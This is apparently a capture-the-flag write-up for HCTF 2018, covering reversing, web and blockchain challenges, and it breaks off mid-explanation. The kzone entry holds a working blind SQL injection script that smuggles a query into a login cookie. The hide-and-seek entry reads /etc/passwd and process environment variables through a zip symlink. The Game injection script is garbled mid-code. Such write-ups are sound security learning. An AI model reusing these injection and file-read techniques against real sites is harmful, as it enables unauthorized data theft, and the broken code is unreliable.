    87544 * 
    ( ( 
    71583 + ( 
    20370 + ( 
    37968 
    * ( 17478 + ( ( 40532 + ( 
    10089 + ( 13332 * ( 
    ( 24170 
    + ( 46845 * ( 16048 + 
    ( 
    23142 * ( 31895 + ( 62386 * ( 
    12179 
    + 
    ( 94552 + ( ( ( 52918 
    + ( 91580 + ( 
    ( ( 38412 + ( 91537 * ( 70 
    + ( 98594 * ( ( 35275 
    + ( 62912 * 
    ( 4755 + ( 
    16737 * ( 27595 
    + ( ( 43551 + 
    ( 64482 * 3550 
    ) ) - 21031 ) ) 
    ) ) ) ) - 57553 ) 
    ) ) ) 
    ) - 89883 ) - 38900 ) ) 
    ) - 19517 ) - 
    79082 ) ) ) ) ) ) ) ) 
    ) 
    - 70643 ) ) 
    ) ) - 
    55350 ) ) ) 
    ) ) - 40301 ) ) 
    ) ) - 83065 ) ) 
    ) ) ) - 
    52460 
    ) ) - 49428 ) - 94686 
    ) ) ) ) ) ) - 1653 ) 
    - 65217 ) 
    ) ) ) ) ) ) 
    ) ) ) ) ) ) 
    ) ) - 43827 ) 
    ) ) 
    ) ) 
    - 
    66562 ) ) 
    )
    In [3]: s
    Out[3]: '44646+(64094+(71825*((15873+(21793*(7234+(17649*((2155+(74767*(35392+(88216*(83920+(16270+(20151*(5268+(90693*(82773+(716+(27377*(44329+(49366*(((3
    8790+(70247*(97233+(18347+(22117*(((72576+((47541+(46975+(53769*(94005+((72914+(5137+(87544*((71583+(20370+(37968*(17478+((40532+(10089+(13332*((24170+(4684
    5*(16048+(23142*(31895+(62386*(12179+(94552+(((52918+(91580+(((38412+(91537*(70+(98594*((35275+(62912*(4755+(16737*(27595+((43551+(64482*3550))-21031))))))-    57553)))))-89883)-38900)))-19517)-79082)))))))))-70643))))-55350)))))-40301))))-83065)))))-52460))-49428)-94686))))))-1653)-65217)))))))))))))))-43827)))))-    66562)))'
    In [4]: eval(s)
    Out[4]: 245160825372454180181035013425094268426669928853472000168466067114757309065141074622457247656884957267064733565L
    In [5]: hex(_)
    Out[5]: '0x686374667b50306c3173685f4475636b5f5461737433735f44336c3163693075735f44305f555f5468316e6b3f7dL'
    In [6]: '686374667b50306c3173685f4475636b5f5461737433735f44336c3163693075735f44305f555f5468316e6b3f7d'.decode('hex')
    Out[6]: 'hctf{P0l1sh_Duck_Tast3s_D3l1ci0us_D0_U_Th1nk?}'
## Web
### kzone
    #encoding:utf-8
    import requests
    import string
    import base64
    def catch(num,str):
        url="http://kzone.2018.hctf.io/admin/index.php"
        header={
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh,en-US;q=0.7,en;q=0.3',
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/41.0"
               ,"Cookie":'''PHPSESSID=f4e2rj8ofjp0r4k4s205drkj74;islogin=1; login_data={"admin_user":"admin'and((select(mi\\u0064(hex(group_concat(F1a9)),%d,1))from(F1444g))\\u003d'%s')\\u0023","admin_pass":true};'''%(num,str)
        }
        #data={"username":"admin'&&mid(password,%d,1)='%s'#" % (num,str),"password":"1"} 
        #strings="aaaaaaaa' or mid(username,1,1)='a' and '1"
        #print url
        #正常用法
        r=requests.get(url,headers=header,proxies={"http":"127.0.0.1:8080"})
        #用于burp调试
        #r=requests.get(url,headers=header,proxies={"http":"127.0.0.1:8080"})
        #print r.content
        res=r.headers
        #print "##################################"
        # found=False
        c_len = len(res)
        if c_len==9:
            return 1
        return 0
    if __name__ == "__main__":
        #payloads = list(string.ascii_lowercase)
        #payloads.append("_;")
        payloads='0123456789abcdef'
        #payloads = list('sysadmin:0123456789_abcdefghijklmnopqrstuvwxyz ,ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
        user=''
        for i in range(1,500):
            for j in payloads:
                print j
                if catch(i,j)==1:
                    user=user+j
                    print "now %d user is %s" % (i,user)
                    break
        #print catch(1,"5")
### admin
> view-source:  
>  有代码 
    if request.method == 'POST':
            name = strlower(form.username.data)
            session['name'] = name
            user = User.query.filter_by(username=name).first()
            if user is None or not user.check_password(form.password.data):
                flash('Invalid username or password')
                return redirect(url_for('login'))
            login_user(user, remember=form.remember_me.data)
            return redirect(url_for('index'))
        return render_template('login.html', title = 'login', form = form)
u型编码注册就行了  
### bottle
### hide and seek
    user  nginx;
    worker_processes auto;
    error_log  /var/log/nginx/error.log warn;
    pid        /var/run/nginx.pid;
    events {
        worker_connections  1024;
    }
    http {
        include       /etc/nginx/mime.types;
        default_type  application/octet-stream;
        log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                          '$status $body_bytes_sent "$http_referer" '
                          '"$http_user_agent" "$http_x_forwarded_for"';
        access_log  /var/log/nginx/access.log  main;
        sendfile        on;
        #tcp_nopush     on;
        keepalive_timeout  65;
        #gzip  on;
        include /etc/nginx/conf.d/*.conf;
    }
    daemon off;
zip软连接读取文件
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/bin/false
    nginx:x:101:102:nginx user,,,:/nonexistent:/bin/false
    messagebus:x:102:103::/var/run/dbus:/bin/false
目标 寻找到config.py  
读`proc/self/environ`
    UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi
    SUPERVISOR_GROUP_NAME=uwsgi
    HOSTNAME=7d8beb1a9aa4
    SHLVL=0
    PYTHON_PIP_VERSION=18.1
    HOME=/root
    GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
    UWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini
    NGINX_MAX_UPLOAD=0
    UWSGI_PROCESSES=16
    STATIC_URL=/static
    UWSGI_CHEAPER=2
    NGINX_VERSION=1.13.12-1~stretch
    PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    NJS_VERSION=1.13.12.0.2.0-1~stretch
    LANG=C.UTF-8
    SUPERVISOR_ENABLED=1
    PYTHON_VERSION=3.6.6
    NGINX_WORKER_PROCESSES=auto
    SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock
    SUPERVISOR_PROCESS_NAME=uwsgi
    LISTEN_PORT=80
    STATIC_INDEX=0    
    PWD=/app/hard_t0_guess_n9f5a95b5ku9fg
    STATIC_PATH=/app/static
    PYTHONPATH=/app
    UWSGI_RELOADS=0
读
`/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py`，伪造session就拿到flag了
### Game | solved | working:
描述  
crazy inject  
URL 
    #encoding:utf-8
    import requests
    import string
    import base64
    import random
    def catch(num,str1):
        a=0
        b=97
        while(a\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t1\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tadmin')
            print usernew
            index2=sss.index(usernew)
            print index1
            print index2
            if index1 > index2:
                b =  mid -1
            else:
                a = mid +1
        tmp =hex(a-1)[2:]
        if len(tmp)==1:
            tmp="0"+tmp
        return "%"+tmp
        #print "##################################"
        # found=False
    if __name__ == "__main__":
        #payloads = list(string.ascii_lowercase)
        #payloads.append("_;")
        payloads='!"#$%&\'()*+,-./:;?@0123456789abcdefghijklmnopqrstuvwxyz[\\]^_`{|}~'
        #payloads = list('sysadmin:0123456789_abcdefghijklmnopqrstuvwxyz ,ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
        user='%44%53%41%38%26%26%21%40%23%24%25'
        for i in range(1,100):
            user = user+catch(i,user)
            print "now user is "+user
        #catch(5,"dsa8 参考coppersmith经典文章直接出flag
## BlockChain
### Re:Ethereum from zero
This is a challenge about smart contract reversing, we were given the
`genesis.json` and the enode public key. We can use these to connect to the
private network. We can also get our private key from the team token and
import it into geth.
To get the first part of the flag, we need to satisfy:
`balance(player_account) > 0`. This is easy to achieve, by simply mining
several blocks.
In order to complete the second part, we need to find where the contracts are.
Using the following script we can have a brief overview of the blocks
containing transactions:
    // loadScript() in geth
    for(var i=0; i<eth.blockNumber;i++) {
      var block = eth.getBlock(i);
      if(block.transactions.length != 0) {
        console.log("Block with tx: " + i.toString());
      }
    }
And the results:
    Block with tx: 23
    Block with tx: 49
    Block with tx: 273
    Block with tx: 4049
    Block with tx: 4950
    Block with tx: 5226
The first transaction is located at block 23, which creates a contract at
`0x628187b11ef814fe75dc9d33c813961b71153afc`. And sequentially the
transactions in block 49 and 273 interacts with the contract created by the
first transaction. By the time I got a little confused: where are the other
contracts mentioned in `hint2`?
So I decided to take a closer look at this contract. Using [ethervm
decompiler](https://ethervm.io/decompile) to decompile could give us a boost
(but this one has a lot of defects, I've heard lots of people already have
private EVM decompiler added to their inventory... sigh). Reversing result
showed it's actually a deployer contract, which will decrypt and create user
specified contract. To get the address of the newly created contracts, we need
to trace the transactions. `debug_traceTransaction` is a method exposed by
geth RPC, connecting [remix debugger](https://remix.ethereum.org/) to the RPC
will provide us a user-friendly GUI tracer. So we found the contract deployed
at `0x15ec709c5d749345a3bcfc36a5b6bb695aba51e4`.
There is only one function inside this contract and the logic looks like the
following psuedocode: